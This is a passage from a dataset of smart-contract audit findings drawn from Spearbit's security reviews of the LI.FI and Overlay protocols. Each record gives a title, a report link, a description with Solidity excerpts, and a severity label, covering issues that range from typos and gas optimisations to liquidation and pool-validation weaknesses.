        "body": "LiFi supports Polygon on their implementation. However, Native MATIC on the Polygon has the contract 0x0000000000000000000000000000000000001010 address. Even if, It does not pose any risk, Native Matic will be treated as an ERC20 token. contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; // address(0) ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multiple versions of noLeftovers modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The modifier noLeftovers is defined in 3 different files: Swapper.sol, SwapperV2.sol and Ex- ecutor.sol. While the versions on Swapper.sol and Executor.sol are the same, they differ with the one in Executor.sol. Assuming the recommendation for \"Processing of end balances\" is followed, the only difference is that noLeftovers in SwapperV2.sol doesnt revert when new balance is less than initial balance. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reduce unchecked scope",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Both zapIn() functions in FusePoolZap.sol operate in unchecked block which means any contained arithmetic can underflow or overflow. Currently, it effects only one line in both functions:  FusePoolZap.sol#L67: uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)) - preMintBalance;  FusePoolZap.sol#L104 mintAmount = mintAmount - preMintBalance; Having unchecked for such a large scope when it is applicable to only one line is dangerous.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "No event exists for core paths/functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces. There are 4 instances of this issue: 67 contract PeripheryRegistryFacet { function registerPeripheryContract(...) ... { } } contract LibAccess { function addAccess(...) ... { } function removeAccess(...) ... { } } contract AccessManagerFacet { function setCanExecute(...) ... { } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename _receiver to _leftoverReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the contracts Swapper.sol, SwapperV2.sol and Executor.sol the parameter _receiver is used in various places. Its name seems to suggest that the result of the swapped tokens are send to the _receiver, however this is not the case. Instead the left over tokens are send to the _receiver. This makes the code more difficult to read and maintain. contract SwapperV2 is ILiFi { modifier noLeftovers(..., address payable _receiver) { ... } function _executeAndCheckSwaps(..., address payable _receiver) ... { ... } function _executeSwaps(..., address payable _receiver) ... { ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Native tokens dont need SwapData.approveTo",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. These checks also include a check on approveTo, however approveTo is not relevant when a native token is being used. Currently the caller of the Lifi Diamond has to specify a whitelisted currentSwapData.approveTo to be able to execute _executeSwaps() which doesnt seem logical. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate comment on the maxApproveERC20() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that comment is incompatible with the functionality. maxApproveERC20 function approves MAX If asset id does not have sufficient allowance. The comment can be replaced with If a sufficient allowance is not present, the allowance is set to MAX. /// @notice Gives MAX approval for another address to spend tokens /// @param assetId Token address to transfer /// @param spender Address to give spend approval to /// @param amount Amount to approve for spending function maxApproveERC20( IERC20 assetId, address spender, uint256 amount )",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Undocumented contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "All systematic contracts are documented on the docs directory. However, several contracts are not documented. LiFi is integrated with third party platforms through API. To understand code functionality, the related contracts should be documented in the directory.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Utilize built-in library function on the address check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the codebase, LibAsset library contains the function which determines whether the given assetId is the native asset. However, this check is not used and many of the other contracts are applying address check seperately. contract AmarokFacet { function startBridgeTokensViaAmarok(...) ... { ... if (_bridgeData.assetId == address(0)) ... } function swapAndStartBridgeTokensViaAmarok(... ) ... { ... if (_bridgeData.assetId == address(0)) ... } } contract AnyswapFacet { function swapAndStartBridgeTokensViaAnyswap(...) ... { ... if (_anyswapData.token == address(0)) revert TokenAddressIsZero(); ... } } contract HyphenFacet { function _startBridge(...) ... { ... if (_hyphenData.token != address(0)) ... } } contract StargateFacet { function _startBridge(...) ... { ... if (token == address(0)) ... 70 } } contract LibAsset { function transferFromERC20(...) ... { ... if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); ... } function transferAsset(...) ... { ... (assetId == NATIVE_ASSETID) ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using wrapped native token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The code currently supports bridging native tokens. However this has the following drawbacks:  not every bridge supports native tokens;  native tokens have an inherent risk of reentrancy;  native tokens introduce additional code paths, which is more difficult to maintain and results in a higher risk of bugs. Also wrapped tokens are more composable. This is also useful for bridges that currently dont support native tokens like the AxelarFacet, the WormholeFacet, and the StargateFacet.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect event emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Li.fi follows a two-step ownership transfer pattern, where the current owner first proposes an address to be the new owner. Then that address accepts the ownership in a different transaction via confirmOwnership- Transfer(): function confirmOwnershipTransfer() external { if (msg.sender != pendingOwner) revert NotPendingOwner(); owner = pendingOwner; pendingOwner = LibAsset.NULL_ADDRESS; emit OwnershipTransferred(owner, pendingOwner); } At the time of emitting OwnershipTransferred, pendingOwner is always address(0) and owner is the new owner. This event should be used to log the addresses between which the ownership transfer happens.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "If statement does not check mintAmount properly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the zapIn function, mintAmount is checked with the following If statement. However, It is directly getting contract balance instead of taking difference between mintAmount and preMintBalance. ... ... uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)); if (!success && mintAmount == 0) { revert MintingError(res); } mintAmount = mintAmount - preMintBalance;",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use address(0) for zero address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Its better to use shorthands provided by Solidity for popular constant values to improve readability and likelihood of errors. address internal constant NULL_ADDRESS = 0x0000000000000000000000000000000000000000; //address(0)",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Better variable naming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "MAX_INT is defined to be the maximum value of uint256 data type: uint256 private constant MAX_INT = type(uint256).max; This variable name can be interpreted as the maximum value of int256 data type which is lower than type(uint256).max.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event is missing indexed fields",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so its not necessarily best to index the maximum allowed per event (three fields).",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove misleading comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "WithdrawFacet.sol has the following misleading comment which can be removed. Its unclear why this comment was made. address self = address(this); // workaround for a possible solidity bug",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant events/errors/imports on the contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that several events and errors are not used in the contracts. With the deleting redundant events and errors, gas can be saved.  FusePoolZap.sol#L28 - CannotDepositNativeToken  GenericSwapFacet.sol#L7 - ZeroPostSwapBalance  WormholeFacet.sol#L12 - InvalidAmount and InvalidConfig  HyphenFacet.sol#L32 - HyphenInitialized  HyphenFacet.sol#L9 - InvalidAmount and InvalidConfig  HopFacet.sol#L9 - InvalidAmount, InvalidConfig and InvalidBridgeConfigLength  HopFacet.sol#L36- HopInitialized  PolygonBridgeFacet.sol#L28 - InvalidConfig  Executor.sol#L5 - IAxelarGasService  AcrossFacet.sol#L37 - UseWethInstead, InvalidAmount, NativeValueWithERC, InvalidConfig  NXTPFacet.sol#L9 - InvalidAmount, NativeValueWithERC, NoSwapDataProvided, InvalidConfig",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "forceSlow option is disabled on the AmarokFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the AmarokFacet contract, forceSlow option is disabled. According to documentation, forceS- low is an option that allows users to take the Nomad slow path (~30 mins) instead of paying routers a 0.05% fee on their transaction. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incomplete NatSpec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Some functions are missing @param for some of their parameters. Given that NatSpec is an impor- tant part of code documentation, this affects code comprehension, auditability and usability.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use nonReentrant modifier in a consistent way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "AxelarFacet, zapIn of the contract FusePoolZap and completeBridgeTokensViaStargate() - swapAndCom- pleteBridgeTokensViaStargate of the StargateFacet dont have a nonReentrant modifier. All other facets that integrate with the external contract do have this modifier. executeCallWithTokenViaAxelar of contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { } function executeCallViaAxelar(...) ... { } } contract FusePoolZap { function zapIn(...) ... { } } There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant. The makes the code more difficult to maintain and verify. contract StargateFacet is ILiFi, SwapperV2, ReentrancyGuard { function sgReceive(...) external nonReentrant { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, receiver); ... } function completeBridgeTokensViaStargate(...) external { ... } } contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos on the codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Across the codebase, there are typos on the comments.  cancelOnwershipTransfer -> cancelOwnershipTransfer.  addresss -> address.  Conatains -> Contains.  Intitiates -> Initiates.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Store all error messages in GenericErrors.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The file GenericErrors.sol contains several error messages and is used from most other solidity files. However several other error messages are defined in the solidity files themselves. It would be more con- sistent and easier to maintain to store these in GenericErrors.sol as well. Note: the Periphery contract also contains error messages which are not listed below. Here are the error messages contained in the solidity files: Facets/AcrossFacet.sol:37: Facets/AmarokFacet.sol:31: Facets/ArbitrumBridgeFacet.sol:30: Facets/GnosisBridgeFacet.sol:31: Facets/GnosisBridgeFacet.sol:32: Facets/OmniBridgeFacet.sol:27: Facets/OptimismBridgeFacet.sol:29: Facets/OwnershipFacet.sol:20: Facets/OwnershipFacet.sol:21: Facets/OwnershipFacet.sol:22: Facets/OwnershipFacet.sol:23: Facets/PolygonBridgeFacet.sol:28: Facets/PolygonBridgeFacet.sol:29: Facets/StargateFacet.sol:39: Facets/StargateFacet.sol:40: Facets/StargateFacet.sol:41: Facets/WithdrawFacet.sol:20: Facets/WithdrawFacet.sol:21: Helpers/ReentrancyGuard.sol:20: Libraries/LibAccess.sol:18: Libraries/LibSwap.sol:9: error UseWethInstead(); error InvalidReceiver(); error InvalidReceiver(); error InvalidDstChainId(); error InvalidSendingToken(); error InvalidReceiver(); error InvalidReceiver(); error NoNullOwner(); error NewOwnerMustNotBeSelf(); error NoPendingOwnershipTransfer(); error NotPendingOwner(); error InvalidConfig(); error InvalidReceiver(); error InvalidConfig(); error InvalidStargateRouter(); error InvalidCaller(); error NotEnoughBalance(uint256 requested, uint256 available); error WithdrawFailed(); error ReentrancyError(); error UnAuthorized(); error NoSwapFromZeroBalance();",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use unchecked in TickMath.sol and FullMath.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Uniswap math libraries rely on wrapping behaviour for conducting arithmetic operations. Solidity version 0.8.0 introduced checked arithmetic by default where operations that cause an overflow would revert. Since the code was adapted from Uniswap and written in Solidity version 0.7.6, these arithmetic operations should be wrapped in an unchecked block.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidation might fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The liquidate() function checks if a position can be liquidated and via liquidatable(), uses maintenanceMarginFraction as a factor to determine if enough value is left. However, in the rest of the liqui- date() function liquidationFeeRate is used to determine the fee paid to the liquidator. It is not necessarily true that enough value is left for the fee, as two different ways are used to calculate this which means that positions might be liquidated. This is classified as high risk because liquidation is an essential functionality of Overlay. contract OverlayV1Market is IOverlayV1Market { function liquidate(address owner, uint256 positionId) external { ... require(pos.liquidatable(..., maintenanceMarginFraction),\"OVLV1:!liquidatable\"); ... uint256 liquidationFee = value.mulDown(liquidationFeeRate); ... ovl.transfer(msg.sender, value - liquidationFee); ovl.transfer(IOverlayV1Factory(factory).feeRecipient(), liquidationFee); } } library Position { function liquidatable(..., uint256 maintenanceMarginFraction) ... { ... uint256 maintenanceMargin = posNotionalInitial.mulUp(maintenanceMarginFraction); can_ = val < maintenanceMargin; } } 4",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Rounding down of snapAccumulator might influence calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function transform() lowers snapAccumulator with the following equation: (snapAccumulator * int256(dt)) / int256(snapWindow). During the time that snapAccumulator * dt is smaller than snapWindow this will be rounded down to 0, which means snapAccumulator will stay at the same value. Luckily, dt will eventually reach the value of snapWindow and by then the value wont be rounded down to 0 any more. Risk lies in calculations diverging from formulas written in the whitepaper. Note: Given medium risk severity because the probability of this happening is high, while impact is likely low. function transform(...) ... { ... snapAccumulator -= (snapAccumulator * int256(dt)) / int256(snapWindow); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Verify pool legitimacy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The constructor in OverlayV1UniswapV3Factory.sol and OverlayV1UniswapV3Feed.sol only does a partial check to see if the pool corresponds to the supplied tokens. This is accomplished by calling the pools functions but if the pool were to be malicious, it could return any token. Additionally, checks can be by- passed by supplying the same tokens twice. Because the deployFeed() function is permissionless, it is possible to deploy malicious feeds. Luckily, the de- ployMarket() function is permissioned and prevents malicious markets from being deployed. contract OverlayV1UniswapV3Factory is IOverlayV1UniswapV3FeedFactory, OverlayV1FeedFactory { constructor(address _ovlWethPool, address _ovl, ...) { ovlWethPool = _ovlWethPool; // no check on validity of _ovlWethPool here ovl = _ovl; } function deployFeed(address marketPool, address marketBaseToken, address marketQuoteToken, ...) external returns (address feed_) { // Permissionless ... // no check on validity of marketPool here } 5 } contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { constructor( address _marketPool, address _ovlWethPool, address _ovl, address _marketBaseToken, address _marketQuoteToken, ... ) ... { ... address _marketToken0 = IUniswapV3Pool(_marketPool).token0(); // relies on a valid _marketPool address _marketToken1 = IUniswapV3Pool(_marketPool).token1(); require(_marketToken0 == WETH || _marketToken1 == WETH, \"OVLV1Feed: marketToken != WETH\"); marketToken0 = _marketToken0; marketToken1 = _marketToken1; require( _marketToken0 == _marketBaseToken || _marketToken1 == _marketBaseToken, \"OVLV1Feed: marketToken != marketBaseToken\" ); require( _marketToken0 == _marketQuoteToken || _marketToken1 == _marketQuoteToken, \"OVLV1Feed: marketToken != marketQuoteToken\" ); marketBaseToken = _marketBaseToken; // what if _marketBaseToken == _marketQuoteToken == WETH ? marketQuoteToken = _marketQuoteToken; marketBaseAmount = _marketBaseAmount; // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); // relies on a valid ,! _ovlWethPool address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); require( _ovlWethToken0 == WETH || _ovlWethToken1 == WETH, \"OVLV1Feed: ovlWethToken != WETH\" ); require( _ovlWethToken0 == _ovl || _ovlWethToken1 == _ovl, // What if _ovl == WETH ? \"OVLV1Feed: ovlWethToken != OVL\" ); ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; marketPool = _marketPool; ovlWethPool = _ovlWethPool; ovl = _ovl; }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Liquidatable positions can be unwound by the owner of the position",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The liquidation function can be front-runned since it does not require any deposits. In particular, the liquidation function can be front-runned by the owner of the position by calling unwind. This effectively means that users can prevent themselves from getting liquidated by watching the mempool and frontrunning calls to their liquidation position by calling unwind. Although this behaviour is similar to liquidations in lending protocols where a borrower can front-run a liquidation by repaying the borrow, the lack of collateral requirements for both unwind and liquidation makes this case special. Note: In practice, transactions for liquidations do not end up in the public mempool and are often sent via private relays such as flashbots. Therefore, a scenario where the user finds out about a liquidatable position by the public mempool is likely not common. However, a similar argument still applies. Note: Overlay also allows the owner of the position to be the liquidator, unlike other protocols like compound. The difference in price computation for the liquidation and unwind mechanism may make it better for users to liquidate themselves rather than unwinding their position. However, a check similar to compound is not effective at preventing this issue since users can always liquidate themselves from another address.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Adding constructor params causes creation code to change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Using constructor parameters in create2 makes the construction code different for every case. This makes address calculation more complex as you first have to calculate the construction code, hash it and then do address calculation. Whats worse is that Etherscan does not properly support auto-verification of contracts deployed via create2 with different creation code. Youll have to manually verify all markets individually. Additionally, needless salt in OverlayV1Factory.sol#L129.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential wrap of timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "In the transform() function, a revert could occur right after timestamp32 has wrapped (e.g. when timestamp > 2**32). function transform(... , uint256 timestamp, ...) ... { uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32 ... uint256 dt = uint256(timestamp32 - self.timestamp); // could revert if timestamp32 has just wrapped ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify the validity of _microWindow and _macroWindow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The constructor of OverlayV1Feed doesnt verify the validity of _microWindow and _macroWindow, potentially causing the price oracle to produce bad results if misconfigured. constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Simplify _midFromFeed()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The calculation in _midFromFeed() is more complicated than necessary because: min(x,y) + max(x,y) == x + y. More importantly, the average operation (bid + ask) / 2 can overflow and revert if bid + ask >= 2**256. function _midFromFeed(Oracle.Data memory data) private view returns (uint256 mid_) { uint256 bid = Math.min(data.priceOverMicroWindow, data.priceOverMacroWindow); uint256 ask = Math.max(data.priceOverMicroWindow, data.priceOverMacroWindow); mid_ = (bid + ask) / 2; }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use implicit truncation of timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Solidity will truncate data when it is typecast to a smaller data type, see solidity explicit-conversions. This can be used to simplify the following statement: uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Set pos.entryPrice to 0 after liquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The liquidate() function sets most of the values of pos to 0, with the exception of pos.entryPrice. function liquidate(address owner, uint256 positionId) external { ... // store the updated position info data. mark as liquidated pos.notional = 0; pos.debt = 0; pos.oiShares = 0; pos.liquidated = true; positions.set(owner, positionId, pos); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Store result of expression in temporary variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Several gas optimizations are possible by storing the result of an expression in a temporary variable, such as the value of oiFromNotional(data, capNotionalAdjusted). 10 function build( ... ) { ... uint256 price = isLong ? ask(data, _registerVolumeAsk(data, oi, oiFromNotional(data, capNotionalAdjusted))) : bid(data, _registerVolumeBid(data, oi, oiFromNotional(data, capNotionalAdjusted))); ... require(oiTotalOnSide <= oiFromNotional(data, capNotionalAdjusted), \"OVLV1:oi>cap\"); }  A: The value of pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) could be stored in a temporary variable to save gas.  B: The value of oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) could also be stored in a temporary variable to save gas and make the code more readable.  C: The value of pos.oiSharesCurrent(fraction) could be stored in a temporary variable to save gas. function unwind(...) ... { ... uint256 price = pos.isLong ? bid( data, _registerVolumeBid( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A1 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B1 ) ) : ask( data, _registerVolumeAsk( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A2 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B2 ) ); ... if (pos.isLong) { oiLong -= Math.min( oiLong, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A3 ); oiLongShares -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); // C1 } else { oiShort -= Math.min( oiShort, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A4 ); oiShortShares -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); // C2 } ... pos.oiShares -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); // C3 } The value of 2 * k * timeElapsed could also be stored in a temporary variable: 11 function oiAfterFunding( ...) ... { ... if (2 * k * timeElapsed < MAX_NATURAL_EXPONENT) { fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Flatten code of OverlayV1UniswapV3Feed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Functions _fetch(), _inputsToConsultMarketPool(), _inputsToConsultOvlWethPool() and con- sult() do a lot of interactions with small arrays and loops over them, increasing overhead and reading difficulty.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace memory with calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "External calls to functions with memory parameters can be made more gas efficient by replacing memory with calldata, as long as the memory parameters are not modified.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need to cache immutable values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Variables microWindow and macroWindow are immutable, so it is not necessary to cache them because the compiler inlines their value. contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { function _fetch() internal view virtual override returns (Oracle.Data memory) { // cache micro and macro windows for gas savings uint256 _microWindow = microWindow; uint256 _macroWindow = macroWindow; ... } } abstract contract OverlayV1Feed is IOverlayV1Feed { ... uint256 public immutable microWindow; uint256 public immutable macroWindow; ... constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; } }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify circuitBreaker",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function circuitBreaker() does a divDown() which can be circumvented to save gas and improving readability. function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) ... { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (uint256(minted).divDown(_circuitBreakerMintTarget) >= 2 * ONE) { return 0; } ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimizations if data.macroWindow is constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Several checks are done in contract OverlayV1Market which involve data.macroWindow in combi- nation with a linear calculation. If data.macroWindow does not change (as is the case with the UniswapV3 feed), it is possible to optimize the calculations by precalculating several values.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Remove unused / redundant functions and variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
